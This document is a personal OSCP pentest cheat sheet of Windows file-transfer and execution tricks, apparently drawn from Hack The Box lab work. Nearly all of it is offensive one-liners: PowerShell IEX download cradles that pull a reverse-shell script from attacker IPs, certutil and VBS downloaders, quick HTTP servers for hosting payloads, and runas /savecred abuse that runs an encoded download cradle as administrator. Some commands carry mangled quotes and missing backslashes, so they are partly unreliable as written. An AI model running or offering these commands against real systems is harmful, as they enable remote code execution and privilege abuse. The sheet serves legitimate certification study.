## my OSCP_note

_Download & execute_

`C:\> PowerShell (New-Object System.Net.WebClient).DownloadFile('http://192.168.178.16:8000/launcher.bat’,’launcher.bat'); Start-Process ‘launcher.bat'`


`PS C:\Users\hillie> IEX (New-Object Net.WebClient).DownloadString('http://192.168.178.16/puckieshell443.ps1')`


`c:\Users\Public>certutil -urlcache -split -f http://10.10.14.20/puckieshell443.ps1`



`PS C:\pentest> certutil.exe -f -split -VerifyCTL http://192.168.178.12/msbuild_nps.xml
CertUtil: -verifyCTL command FAILED: 0x8009310b (ASN: 267 CRYPT_E_ASN1_BADTAG)
CertUtil: ASN1 bad tag value met.`

```markdown

PS C:\pentest> dir *.bin

Directory: C:\pentest

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         5/7/2019   4:16 PM           5462 619bd719eb0f011e589ef17f4fd8693d9ba8d481.bin

PS C:\pentest> mv 619bd719eb0f011e589ef17f4fd8693d9ba8d481.bin msbuild_nps.xml

PS C:\pentest> dir *.xml

Directory: C:\pentest

Mode LastWriteTime Length Name
---- ------------- ------ ----
-a---- 5/7/2019 4:16 PM 5462 msbuild_nps.xml

```

```markdown

 echo Set args = Wscript.Arguments  &gt;&gt; webdl.vbs
 timeout 1
 echo Url = "http://1.1.1.1/windows-privesc-check2.exe"  &gt;&gt; webdl.vbs
 timeout 1
 echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")  &gt;&gt; webdl.vbs
 timeout 1
 echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  &gt;&gt; webdl.vbs
 timeout 1
 echo xHttp.Open "GET", Url, False  &gt;&gt; webdl.vbs
 timeout 1
 echo xHttp.Send  &gt;&gt; webdl.vbs
 timeout 1
 echo with bStrm      &gt;&gt; webdl.vbs
 timeout 1
 echo   .type = 1 '      &gt;&gt; webdl.vbs
 timeout 1
 echo   .open      &gt;&gt; webdl.vbs
 timeout 1
 echo   .write xHttp.responseBody      &gt;&gt; webdl.vbs
 timeout 1
 echo   .savetofile "C:tempwindows-privesc-check2.exe", 2 '  &gt;&gt; webdl.vbs
 timeout 1
 echo end with &gt;&gt; webdl.vbs
 timeout 1
 echo

```




_up my server_

python3
`c:\Python37>python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.98 - - [28/Feb/2019 19:38:58] "GET /puckieshell443.ps1 HTTP/1.1" 200 -`

python2
`python2 -m SimpleHTTPServer 8080`

 ruby  http server
`ruby -rwebrick -e “WEBrick::HTTPServer.new
(:Port => 80, :DocumentRoot => Dir.pwd).start”`

 PHP http server
`php -S $ip:80`


_runas_

`C:\Users\Public> runas /user:HTB\administrator /savecred "powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.20/puckieshell443.ps1')"`


`c:\Users\Public> runas /user:ACCESS\administrator /savecred "powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgAwAC8AcAB1AGMAawBpAGUAcwBoAGUAbABsADUAMwAuAHAAcwAxACcAKQA="`


__



